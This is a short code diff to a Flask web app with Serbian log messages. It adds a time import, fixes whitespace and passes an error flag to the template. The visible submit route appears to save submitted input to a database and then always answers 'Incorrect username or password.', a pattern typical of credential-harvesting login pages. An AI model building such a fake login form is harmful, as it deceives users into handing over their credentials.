@@ -1,4 +1,5 @@
 import os
+import time
 from flask import Flask, render_template, request, flash, redirect, url_for
 from flask_sqlalchemy import SQLAlchemy
 from sqlalchemy import text
@@ -25,7 +26,7 @@ with app.app_context():
         with db.engine.connect() as connection:
             result = connection.execute(text('SELECT 1'))
             print(f"✅ Konekcija sa bazom uspešna: {result.fetchone()}")
-        
+
         db.create_all()
         print("✅ Tabela je kreirana!")
     except Exception as e:
@@ -55,7 +56,7 @@ def submit():
         db.session.rollback()
         print(f"❌ Greška pri upisu u bazu: {e}")
 
-    return render_template('index.html', message="Incorrect username or password.")
+    return render_template('index.html', message="Incorrect username or password.", show_error=True)
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 8080))  # ✅ Railway PORT
